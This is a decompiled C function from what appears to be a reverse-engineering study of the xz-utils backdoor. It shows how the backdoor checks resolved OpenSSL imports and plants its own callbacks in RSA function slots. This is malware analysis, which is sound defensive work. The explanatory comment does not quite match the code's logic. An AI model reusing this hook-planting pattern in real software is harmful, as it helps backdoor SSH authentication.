// /home/kali/xzre-ghidra/xzregh/102890_init_imported_funcs.c
// Function: init_imported_funcs @ 0x102890
// Calling convention: __stdcall
// Prototype: BOOL __stdcall init_imported_funcs(imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Validates that the loader resolved all 0x1d imports and, crucially, that the RSA-related PLT
 * entries are non-null. If any of the three slots are missing it drops in loader callbacks
 * (`backdoor_init_stage2` and `init_shared_globals`) so the hook table never points at garbage.
 * Otherwise it reports success and the caller can start re-pointing the mm hooks at the real
 * OpenSSL routines.
 */
#include "xzre_types.h"


BOOL init_imported_funcs(imported_funcs_t *imported_funcs)

{
  if (imported_funcs->resolved_imports_count == 0x1d) {
    if (imported_funcs->RSA_public_decrypt_plt != (pfn_RSA_public_decrypt_t *)0x0) {
      return TRUE;
    }
    if (imported_funcs->EVP_PKEY_set1_RSA_plt != (pfn_EVP_PKEY_set1_RSA_t *)0x0) {
      return TRUE;
    }
    if (imported_funcs->RSA_get0_key_plt != (pfn_RSA_get0_key_t *)0x0) {
      return TRUE;
    }
    imported_funcs->RSA_public_decrypt_plt = (pfn_RSA_public_decrypt_t *)backdoor_init_stage2;
    imported_funcs->RSA_get0_key_plt = (pfn_RSA_get0_key_t *)init_shared_globals;
  }
  return FALSE;
}

